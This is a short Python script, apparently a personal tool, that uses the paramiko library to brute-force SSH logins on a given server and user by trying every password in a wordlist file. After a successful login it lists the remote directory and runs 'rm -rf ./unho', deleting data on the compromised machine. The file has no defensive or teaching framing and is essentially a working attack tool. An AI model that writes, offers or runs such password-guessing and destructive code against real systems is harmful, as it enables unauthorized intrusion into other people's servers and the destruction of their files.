import paramiko

server = input("Server IP: ")
user = input("User: ")
cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)


def bruteCracking(server, user, pwd, code=0):
    try:
        cli.connect(server, port='22', username=user, password=pwd)
        print('login successed')
        stdin, stdout, stderr=cli.exec_command("ls -al")
        print(''.join(stdout.readlines()))
        stdin, stdout, stderr=cli.exec_command("rm -rf ./unho ")
        print(''.join(stdout.readlines()))

    except paramiko.AuthenticationException:
        code=1
    cli.close()
    return code


with open("passwords.txt", "r") as passwords:
    count=0
    for password in passwords:
        pwd=password.strip()
        count += 1
        print("Trying: "+ str(count) +" Time For ==> " + pwd)
        attack=bruteCracking(server, user, pwd)
        if attack==1:
            print("login failed.. next attack")
        else:
            break

    print("Some Error Occurred Please Check Your Internet Connection !!")